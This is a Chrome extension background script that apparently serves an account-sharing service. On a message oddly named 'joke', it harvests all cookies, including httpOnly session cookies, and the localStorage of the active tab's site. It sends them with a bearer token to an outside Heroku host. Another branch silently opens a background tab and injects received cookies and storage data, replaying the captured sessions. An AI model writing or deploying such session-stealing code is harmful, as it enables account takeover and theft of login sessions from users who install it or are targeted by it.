async function getCurrentTab(){
    let queryOptions = {active: true, currentWindow: true};
    let [tab] = await chrome.tabs.query(queryOptions);
    return tab;
}

async function allStorage(data, dataTwo, token) {
    var values = [],
    keys = Object.keys(localStorage),
    i = keys.length;

    while ( i-- ) {
        values.push( localStorage.getItem(keys[i]) );
    }
    
    const obj = {};

    for(let i = 0; i < keys.length; i++){
        obj[keys[i]] = values[i]
    }
    
    let account = {...data, localStorage: JSON.stringify(obj), cookies: JSON.stringify(dataTwo)};

    try{
        const baseUrl = "https://softkeyshare.herokuapp.com/";

        let res = await fetch(baseUrl + "accounts", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${token}`
        },
        body: JSON.stringify({ ...account }),
        });
    
        res = await res.json();

        alert("Operation Successful!");
    }catch(error){
        alert("An error occured!")
    }

    return account;
}

const setLocalStorageAndCookies = async (localStorageData) => {
        const keys = Object.keys(localStorageData);
    
    for(let i = 0; i < keys.length; i++){
        localStorage.setItem(keys[i], localStorageData[keys[i]]);
    }
}

chrome.runtime.onConnect.addListener(async function(port) {
    console.assert(port.name === "knockknock");
    port.onMessage.addListener(async function(msg) {
      if (msg.joke){
         const tab = await getCurrentTab();
        
         const account = {};
         account.name = tab.title;
         account.image = tab.favIconUrl;
         account.url = tab.url;

        const cookies = await chrome.cookies.getAll({url: account.url});

        await chrome.scripting.executeScript({
            target: {tabId: tab.id},
            func: allStorage,
            args: [account, cookies, msg.joke],
        });
      }

      if (msg.anotherJoke){
        const {account, localStorageData, cookiesData} = msg.anotherJoke;
        const tab = await chrome.tabs.create({ url: account.url, active: false });

        const executeScript = async function(){
             chrome.scripting.executeScript({
                    target: {tabId: tab.id},
                    func: setLocalStorageAndCookies,
                    args: [localStorageData]
                });

                cookiesData.map(async cookieData => {
                    return await chrome.cookies.set({
                        domain: cookieData.domain,
                        expirationDate: cookieData.expirationDate,
                        httpOnly: cookieData.httpOnly,
                        name: cookieData.name,
                        path: cookieData.path,
                        sameSite: cookieData.sameSite,
                        secure: cookieData.secure,
                        storeId: cookieData.storeId,
                        url: account.url,
                        value: cookieData.value
                    })
                }); 
            }
        
        setTimeout(executeScript, 15000);
      }
    });
});